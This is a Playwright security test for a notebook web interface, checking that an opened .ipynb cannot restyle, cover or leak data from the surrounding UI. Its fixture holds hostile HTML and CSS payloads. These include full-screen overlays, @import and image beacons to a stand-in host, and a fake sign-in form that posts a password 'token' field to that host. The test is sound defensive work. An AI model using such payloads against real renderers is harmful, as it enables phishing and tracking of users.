import { test, expect } from "@playwright/test";
import type { Page } from "@playwright/test";
import { disableQuickstartTemplate, waitForRuntimeReady } from "./fixtures";

/**
 * A ``.ipynb`` opened from disk is untrusted: its markdown cells and
 * restored outputs must not be able to restyle or cover the rest of the
 * interface, nor make the browser load a remote resource (a tracking
 * beacon, or the target of a fake sign-in form).
 */

const BEACON = "https://datalab-beacon.test";

const HOSTILE_STYLE =
  `<style>@import url("${BEACON}/import.css");` +
  "html, body, .nb-tabs { background: rgb(0, 255, 0) !important; }" +
  ".nb-toolbar { visibility: hidden !important; }" +
  ":host { position: fixed !important; inset: 0 !important;" +
  " z-index: 2147483647 !important; }</style>";

const OVERLAY_STYLE =
  "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;" +
  " z-index: 2147483647; background: rgb(255, 0, 0)";

function hostileNotebook(): string {
  return JSON.stringify({
    nbformat: 4,
    nbformat_minor: 5,
    metadata: {},
    cells: [
      {
        cell_type: "markdown",
        metadata: {},
        source: [
          "# Hostile markdown\n",
          "\n",
          `<div id="md-overlay" style="${OVERLAY_STYLE}">Markdown overlay</div>\n`,
          "\n",
          `${HOSTILE_STYLE}\n`,
          "\n",
          `<img src="${BEACON}/md.png">\n`,
        ],
      },
      {
        cell_type: "code",
        execution_count: 1,
        metadata: {},
        source: ["result"],
        outputs: [
          {
            output_type: "display_data",
            metadata: {},
            data: {
              "text/html":
                HOSTILE_STYLE +
                `<div id="out-overlay" style="${OVERLAY_STYLE}">Fake dialog</div>` +
                `<img src="${BEACON}/img.png">` +
                `<p style="background: url(${BEACON}/inline.png)">x</p>` +
                `<form action="${BEACON}/form"><input name="token" type="password">` +
                "<button>Sign in</button></form>",
            },
          },
          {
            output_type: "display_data",
            metadata: {},
            data: {
              "image/svg+xml":
                '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">' +
                "<style>.nb-tabs { display: none !important; }</style>" +
                `<image href="${BEACON}/svg.png" width="10" height="10"/></svg>`,
            },
          },
        ],
      },
    ],
  });
}

/** Snapshot of styles of the interface around the notebook. */
async function interfaceStyles(page: Page): Promise<Record<string, string>> {
  return page.evaluate(() => {
    const style = (selector: string) => {
      const el = document.querySelector(selector);
      return el ? getComputedStyle(el) : null;
    };
    return {
      body: style("body")?.backgroundColor ?? "",
      tabs: `${style(".nb-tabs")?.display}/${style(".nb-tabs")?.backgroundColor}`,
      toolbar: style(".nb-toolbar")?.visibility ?? "",
    };
  });
}

/** Whether the element at the center of *selector* belongs to it. */
async function isReachable(page: Page, selector: string): Promise<boolean> {
  return page.evaluate((sel) => {
    const el = document.querySelector(sel);
    if (!el) return false;
    const box = el.getBoundingClientRect();
    const hit = document.elementFromPoint(
      box.left + box.width / 2,
      box.top + box.height / 2,
    );
    return hit !== null && el.contains(hit);
  }, selector);
}

test("an opened notebook cannot restyle, cover or leak from the interface", async ({
  page,
}) => {
  const beaconRequests: string[] = [];
  await page.route(`${BEACON}/**`, async (route) => {
    beaconRequests.push(route.request().url());
    await route.fulfill({ status: 204 });
  });
  await disableQuickstartTemplate(page);
  await page.goto("/");
  await waitForRuntimeReady(page);
  await page.getByRole("tab", { name: "Notebooks" }).click();
  await expect(page.locator(".nb-toolbar")).toBeVisible();

  const before = await interfaceStyles(page);
  const tabsBefore = await page.locator(".nb-tab").count();
  await page.locator('input[type="file"][accept*=".ipynb"]').setInputFiles({
    name: "hostile.ipynb",
    mimeType: "application/json",
    buffer: Buffer.from(hostileNotebook()),
  });
  await expect(page.locator(".nb-tab")).toHaveCount(tabsBefore + 1);

  // The notebook content is rendered...
  await expect(page.locator(".nb-cell-markdown-rendered h1")).toHaveText(
    "Hostile markdown",
  );
  await expect(page.locator("#out-overlay")).toHaveText("Fake dialog");
  await expect(page.locator(".nb-output-svg svg")).toHaveCount(1);
  // Soft assertions: a regression reports every broken guarantee at once.
  // ...without its form controls...
  expect
    .soft(await page.locator(".nb-cells form, .nb-cells input").count())
    .toBe(0);
  expect
    .soft(
      await page.locator(".nb-cells button", { hasText: "Sign in" }).count(),
    )
    .toBe(0);

  // ...without restyling the interface around it...
  expect.soft(await interfaceStyles(page)).toEqual(before);

  // ...without covering it: overlays are laid out against their own block
  // (and clipped to it)...
  for (const [overlay, block] of [
    ["#md-overlay", ".nb-cell-markdown-rendered"],
    ["#out-overlay", ".nb-output-html"],
  ]) {
    const overlayBox = await page.locator(overlay).boundingBox();
    const blockBox = await page.locator(block).first().boundingBox();
    expect(overlayBox).not.toBeNull();
    expect(blockBox).not.toBeNull();
    expect.soft(overlayBox!.x, overlay).toBeGreaterThanOrEqual(blockBox!.x - 1);
    expect.soft(overlayBox!.y, overlay).toBeGreaterThanOrEqual(blockBox!.y - 1);
  }
  // ...so the toolbar and tabs still receive the clicks...
  expect.soft(await isReachable(page, ".nb-toolbar"), "toolbar").toBe(true);
  expect.soft(await isReachable(page, ".nb-tabs"), "tabs").toBe(true);

  // ...and without loading any remote resource.
  await page.waitForTimeout(1_000);
  expect.soft(beaconRequests).toEqual([]);
});
